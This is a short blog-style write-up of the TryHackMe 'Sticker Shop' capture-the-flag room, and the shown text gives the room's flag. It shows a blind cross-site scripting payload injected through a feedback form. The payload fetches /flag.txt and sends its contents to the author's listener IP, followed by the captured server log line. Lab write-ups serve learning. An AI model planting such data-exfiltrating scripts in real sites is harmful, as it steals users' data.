---
title: Sticker Shop
date: 2025-1-1 00:00:00
categories: Cybersecurity
tags:
  - THM
  - Writeups
by: Mahmud
---

we need to find the flag in `http://10.10.206.150:8080/flag.txt`

so when enter web page there is feedback tab we can use it for HTML injuction 
lets test it
1. on linux start webserver usng `pyton3 -m http.server 8080`

2. inject feedback with 

```html
   <img src='YourIP:8080'>
```

1. you should see request in teminal so the injuction success 

2. so using chatgpt i create custom injuction 

```html
   <script>
    fetch('/flag.txt')
        .then(response => response.text())
        .then(data => {
            // Redirect to your server with the flag as a query parameter
            window.location.href = 'http://10.21.49.29:9091/?flag=' + encodeURIComponent(data);
        });
</script>

```

1. you will receive

 ```bash
   10.10.206.150 - - [11/Jan/2025 01:03:11] "GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1" 200 -

```
1. using URL decoder on  `flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D`
2. the flag is `THM{83789a69074f636f64a38879cfcabe8b62305ee6}`
